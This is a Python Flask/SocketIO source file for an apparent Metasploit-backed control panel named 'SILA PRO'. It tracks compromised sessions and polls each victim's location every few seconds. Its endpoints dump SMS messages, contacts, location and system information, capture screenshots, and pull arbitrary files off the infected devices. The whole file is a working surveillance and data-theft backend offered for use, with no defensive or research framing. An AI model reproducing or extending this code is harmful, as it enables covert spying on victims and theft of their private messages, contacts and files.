from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit
from rpc_handler import MetasploitRPC
import json
import os
import base64
import time
from threading import Lock

app = Flask(__name__)
app.config['SECRET_KEY'] = 'sila_pro_2026'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')

msf = MetasploitRPC()
thread = None
thread_lock = Lock()
active_sessions = {}
session_data = {}

def background_thread():
    """Hii ina-update sessions moja kwa moja kila sekunde 5"""
    while True:
        socketio.sleep(5)
        sessions = msf.list_sessions()
        if sessions:
            for sid, info in sessions.items():
                if sid not in active_sessions:
                    active_sessions[sid] = info
                    socketio.emit('new_session', {'sid': sid, 'info': info})
                # Update location if available
                if sid not in session_data:
                    session_data[sid] = {}
                # Try to get location as background
                loc = msf.execute_cmd(sid, "get_location")
                if loc and isinstance(loc, dict):
                    session_data[sid]['location'] = loc
                    socketio.emit('location_update', {'sid': sid, 'loc': loc})

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/sessions')
def get_sessions():
    return jsonify(active_sessions)

@app.route('/api/session/<sid>/data')
def get_session_data(sid):
    data = {}
    data['sms'] = msf.execute_cmd(sid, "dump_sms")
    data['contacts'] = msf.execute_cmd(sid, "dump_contacts")
    data['location'] = msf.execute_cmd(sid, "get_location")
    data['system'] = msf.execute_cmd(sid, "sysinfo")
    return jsonify(data)

@app.route('/api/session/<sid>/screenshot')
def take_screenshot(sid):
    result = msf.execute_cmd(sid, "screenshot")
    if result and isinstance(result, dict) and 'image' in result:
        # Decode base64 and serve
        img_data = base64.b64decode(result['image'])
        return send_file(img_data, mimetype='image/png')
    return jsonify({'error': 'No screenshot'}), 404

@app.route('/api/session/<sid>/download', methods=['POST'])
def download_file(sid):
    remote_path = request.json.get('path')
    if not remote_path:
        return jsonify({'error': 'No path'}), 400
    # Download to backend/static/downloads/
    local_dir = f"static/downloads/{sid}/"
    os.makedirs(local_dir, exist_ok=True)
    local_file = os.path.join(local_dir, os.path.basename(remote_path))
    result = msf.download_file(sid, remote_path, local_file)
    return jsonify({'status': 'downloaded', 'local_path': local_file})

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'SILA PRO Panel Online'})

@socketio.on('fetch_all')
def handle_fetch_all(sid):
    data = get_session_data(sid)
    emit('session_data', {'sid': sid, 'data': data})

if __name__ == '__main__':
    # Start background thread
    with thread_lock:
        if thread is None:
            thread = socketio.start_background_task(background_thread)
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
